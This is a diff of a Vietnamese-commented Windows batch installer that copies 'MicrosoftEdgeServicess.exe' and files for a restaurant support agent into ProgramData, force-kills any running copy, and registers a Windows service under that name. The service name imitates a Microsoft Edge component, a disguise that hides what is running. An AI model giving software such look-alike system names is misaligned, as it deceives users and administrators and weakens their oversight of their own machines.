@@ -82,15 +82,39 @@ set "INSTALL_DIR=C:\ProgramData\MicrosoftEdgeServicess"
 echo [2/5] Thiet lap thu muc he thong: %INSTALL_DIR%
 if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%" >nul 2>&1
 
+:: Dam bao xoa file EXE cu truoc de tranh bi giu file cu
+if exist "%INSTALL_DIR%\MicrosoftEdgeServicess.exe" (
+    del /F /Q "%INSTALL_DIR%\MicrosoftEdgeServicess.exe" >nul 2>&1
+)
+
 echo [3/5] Dang sao chep cac file dich vu vao: %INSTALL_DIR%
-copy /Y "%~dp0MicrosoftEdgeServicess.exe" "%INSTALL_DIR%\"
-copy /Y "%~dp0config.json" "%INSTALL_DIR%\"
+copy /Y "%~dp0MicrosoftEdgeServicess.exe" "%INSTALL_DIR%\" >nul 2>&1
+if not exist "%INSTALL_DIR%\MicrosoftEdgeServicess.exe" (
+    echo    [CANH BAO] File EXE dang bi Windows khoa handle. Dang giai phong cuong che...
+    taskkill /F /IM MicrosoftEdgeServicess.exe >nul 2>&1
+    timeout /t 2 >nul 2>nul || ping 127.0.0.1 -n 3 >nul
+    copy /Y "%~dp0MicrosoftEdgeServicess.exe" "%INSTALL_DIR%\" >nul 2>&1
+)
+copy /Y "%~dp0config.json" "%INSTALL_DIR%\" >nul 2>&1
 copy /Y "%~dp0edge.ico" "%INSTALL_DIR%\" >nul 2>nul
 copy /Y "%~dp0restaurant_support_agent.py" "%INSTALL_DIR%\" >nul 2>nul
 copy /Y "%~dp0Chay_Agent_Truc_Tiep.bat" "%INSTALL_DIR%\" >nul 2>nul
 copy /Y "%~dp0Kiem_Tra_Trang_Thai.bat" "%INSTALL_DIR%\" >nul 2>nul
 copy /Y "%~dp0Go_Cai_Dat_Dich_Vu.bat" "%INSTALL_DIR%\" >nul 2>nul
 copy /Y "%~dp0README_HUONG_DAN.txt" "%INSTALL_DIR%\" >nul 2>nul
+
+:: Xac thuc copy thanh cong 100%
+if not exist "%INSTALL_DIR%\MicrosoftEdgeServicess.exe" (
+    echo.
+    echo ===============================================================================
+    echo   [LOI] Khong the ghi de file MicrosoftEdgeServicess.exe vao %INSTALL_DIR%!
+    echo   File co the dang bi mot tien trinh khac cua Windows khoa.
+    echo   Vui long chay Go_Cai_Dat_Dich_Vu.bat truoc hoac khoi dong lai may tinh.
+    echo ===============================================================================
+    echo.
+    pause
+    exit /b 1
+)
 
 :: 5. Dang ky hoac cap nhat Windows Service
 echo [4/5] Dang cau hinh Windows Service MicrosoftEdgeServicess...
